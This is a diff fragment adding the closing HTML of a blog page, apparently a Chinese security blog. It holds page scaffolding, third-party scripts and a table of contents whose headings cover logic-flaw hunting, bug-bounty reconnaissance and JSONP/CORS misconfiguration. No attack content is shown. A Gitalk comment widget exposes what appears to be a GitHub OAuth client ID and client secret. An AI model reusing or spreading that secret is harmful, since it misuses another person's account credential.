+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='a69212da3fc88cd39af9'
+        data-cs='19e2c5d71620cb7b14d99a908f8134be70bd83fa'
+        data-r='gittalksamny'
+        data-o='samny520'
+        data-a='samny520'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#逻辑漏洞挖掘"><span class="toc-number">1.</span> <span class="toc-text">逻辑漏洞挖掘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二期"><span class="toc-number"></span> <span class="toc-text">第二期</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于-burpsuite的web逻辑漏洞插件开发"><span class="toc-number">1.</span> <span class="toc-text">基于 burpsuite的web逻辑漏洞插件开发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第四期-SRC挖掘"><span class="toc-number"></span> <span class="toc-text">第四期 SRC挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【查找敏感文件】"><span class="toc-number">1.</span> <span class="toc-text">【查找敏感文件】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【查找敏感目录地址】"><span class="toc-number">2.</span> <span class="toc-text">【查找敏感目录地址】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于备案号，copyright信息查询"><span class="toc-number">2.1.</span> <span class="toc-text">基于备案号，copyright信息查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可以正则的形式"><span class="toc-number">3.</span> <span class="toc-text">可以正则的形式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#微信公共号"><span class="toc-number">4.</span> <span class="toc-text">微信公共号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#主动信息收集"><span class="toc-number">5.</span> <span class="toc-text">主动信息收集</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第五期"><span class="toc-number"></span> <span class="toc-text">第五期</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP跨域安全开发实践方面"><span class="toc-number">1.</span> <span class="toc-text">JSONP跨域安全开发实践方面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp开发实践中经常会出现的一些问题"><span class="toc-number">2.</span> <span class="toc-text">jsonp开发实践中经常会出现的一些问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cors"><span class="toc-number">3.</span> <span class="toc-text">cors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS中开发误配置所导致的安全问题："><span class="toc-number">4.</span> <span class="toc-text">CORS中开发误配置所导致的安全问题：</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/test.js"></script>
+<script src="/js/tx.js"></script>
+<script src="/js/x.js"></script>
+<script src="/js/xiantiao.js"></script>
+<script src="/js/baidu.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- 在想要使用窗口小部件的地方插入该标签 -->
+<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">
+
+
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '218065278', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
